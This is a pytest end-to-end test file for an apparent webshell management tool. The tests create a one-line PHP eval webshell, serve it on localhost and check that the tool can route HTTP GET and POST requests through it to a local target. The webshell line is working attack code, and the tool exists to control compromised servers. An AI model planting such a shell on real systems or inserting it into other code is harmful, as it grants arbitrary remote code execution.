import asyncio
import subprocess
import sys
import time
import uuid
import tempfile
import os
from pathlib import Path
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading

import httpx
import pytest

HOST = "127.0.0.1"
PORT = 18023
BASE_URL = f"http://{HOST}:{PORT}"

PHP_HOST = "127.0.0.1"
PHP_PORT = 18099
PHP_URL = f"http://{PHP_HOST}:{PHP_PORT}/shell.php"

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 18098
TARGET_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"


TARGET_RESPONSE_BODY = "hello from target server"


class TargetHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("X-Test-Header", "test-value")
        self.end_headers()
        self.wfile.write(TARGET_RESPONSE_BODY.encode())

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length) if content_length > 0 else b""
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, format, *args):
        pass


def _check_php_available():
    try:
        result = subprocess.run(["php", "-v"], capture_output=True, timeout=5)
        return result.returncode == 0
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return False


def _check_php_curl():
    try:
        result = subprocess.run(
            ["php", "-r", "echo function_exists('curl_init') ? 'yes' : 'no';"],
            capture_output=True,
            timeout=5,
            text=True,
        )
        return result.returncode == 0 and "yes" in result.stdout
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return False


def _create_php_shell(directory: Path):
    shell_path = directory / "shell.php"
    shell_path.write_text("<?php eval($_POST['cmd']); ?>")


@pytest.fixture(scope="module")
def backend_server():
    proc = subprocess.Popen(
        [
            sys.executable,
            "-m",
            "ether_ghost",
            "--host",
            HOST,
            "--port",
            str(PORT),
            "--no-browser",
        ],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    started = False
    for _ in range(100):
        time.sleep(0.1)
        try:
            resp = httpx.get(f"{BASE_URL}/session")
            if resp.status_code == 200:
                started = True
                break
        except httpx.ConnectError:
            continue
    if not started:
        stdout = proc.stdout.read() if proc.stdout else b""
        stderr = proc.stderr.read() if proc.stderr else b""
        proc.terminate()
        proc.wait()
        pytest.fail(
            f"Backend failed to start.\nstdout: {stdout.decode()}\nstderr: {stderr.decode()}"
        )
    yield proc
    proc.terminate()
    proc.wait()


@pytest.fixture(scope="module")
def target_server():
    server = HTTPServer((TARGET_HOST, TARGET_PORT), TargetHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    yield server
    server.shutdown()


@pytest.fixture(scope="module")
def php_server():
    if not _check_php_available():
        pytest.skip("PHP not available, skipping PHP webshell HTTP request test")
    if not _check_php_curl():
        pytest.skip("PHP curl extension not available")
    tmpdir = tempfile.mkdtemp()
    tmpdir_path = Path(tmpdir)
    _create_php_shell(tmpdir_path)
    proc = subprocess.Popen(
        ["php", "-S", f"{PHP_HOST}:{PHP_PORT}", "-t", str(tmpdir_path)],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    started = False
    for _ in range(50):
        time.sleep(0.1)
        try:
            resp = httpx.post(PHP_URL, data={"cmd": "echo 'test';"})
            started = True
            break
        except httpx.ConnectError:
            continue
    if not started:
        proc.terminate()
        proc.wait()
        pytest.skip("PHP built-in server failed to start")
    yield proc
    proc.terminate()
    proc.wait()


def test_php_send_http_request_get(backend_server, target_server, php_server):
    session_id = str(uuid.uuid4())
    add_resp = httpx.post(
        f"{BASE_URL}/update_webshell",
        json={
            "session_type": "ONELINE_PHP",
            "name": "e2e_http_test",
            "connection": {
                "url": PHP_URL,
                "password_method": "POST",
                "password": "cmd",
                "http_params_obfs": False,
            },
            "session_id": session_id,
            "note": "e2e http request test",
            "location": "",
        },
    )
    assert add_resp.status_code == 200
    assert add_resp.json()["code"] == 0

    try:
        send_resp = httpx.post(
            f"{BASE_URL}/session/{session_id}/send_http_request",
            json={
                "url": TARGET_URL,
                "method": "GET",
            },
            timeout=30,
        )
        assert send_resp.status_code == 200
        result = send_resp.json()
        assert result["code"] == 0, f"send_http_request GET failed: {result}"
    finally:
        httpx.delete(f"{BASE_URL}/session/{session_id}")


def test_php_send_http_request_post(backend_server, target_server, php_server):
    session_id = str(uuid.uuid4())
    add_resp = httpx.post(
        f"{BASE_URL}/update_webshell",
        json={
            "session_type": "ONELINE_PHP",
            "name": "e2e_http_post_test",
            "connection": {
                "url": PHP_URL,
                "password_method": "POST",
                "password": "cmd",
                "http_params_obfs": False,
            },
            "session_id": session_id,
            "note": "e2e http post test",
            "location": "",
        },
    )
    assert add_resp.status_code == 200
    assert add_resp.json()["code"] == 0

    try:
        post_body = "test_post_data"
        send_resp = httpx.post(
            f"{BASE_URL}/session/{session_id}/send_http_request",
            json={
                "url": TARGET_URL,
                "method": "POST",
                "data": post_body,
            },
            timeout=30,
        )
        assert send_resp.status_code == 200
        result = send_resp.json()
        assert result["code"] == 0, f"send_http_request POST failed: {result}"
    finally:
        httpx.delete(f"{BASE_URL}/session/{session_id}")
